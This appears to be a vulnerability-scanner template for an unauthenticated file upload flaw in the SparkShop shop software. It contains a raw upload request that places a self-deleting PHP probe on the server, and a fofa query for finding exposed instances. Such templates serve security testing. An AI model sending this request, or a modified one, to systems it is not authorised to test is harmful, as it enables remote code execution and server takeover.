http:
    - matchers:
        - part: body
          type: word
          words:
            - upload success
        - status:
            - 200
          type: status
      matchers-condition: and
      raw:
        - |
          POST /api/Common/uploadFile HTTP/1.1
          Host: {{Hostname}}
          User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:99.0) Gecko/20100101 Firefox/99.0
          Content-Type: multipart/form-data; boundary=d0b7a0d40eed0e32904c8017b09eb305

          --d0b7a0d40eed0e32904c8017b09eb305
          Content-Disposition: form-data; name="file";filename="rce.php"

          <?php print(111*222);unlink(__FILE__);?>
          --d0b7a0d40eed0e32904c8017b09eb305--
id: SparkShop-uploadFile-File-upload
info:
    author: Superhero
    description: |-
        fofa: "SparkShop"
        SparkShop开源商城 uploadFile 接口存在任意文件上传漏洞，未经身份验证的攻击者可通过该漏洞在服务器端任意执行代码，写入后门，获取服务器权限，进而控制整个 web 服务器。
    name: SparkShop开源商城 uploadFile 任意文件上传漏洞
    reference:
        - https://mp.weixin.qq.com/s?__biz=MzkzMTcwMTg1Mg==&mid=2247486929&idx=1&sn=8a56acbbb229a08f4f76595a0dba937e&chksm=c267b8e2f51031f45ee7ff04194227324c32895b85b15e387644c4a74d6092b347d8aa550ca9&token=239710718&lang=zh_CN#rd
    severity: high
    tags: []
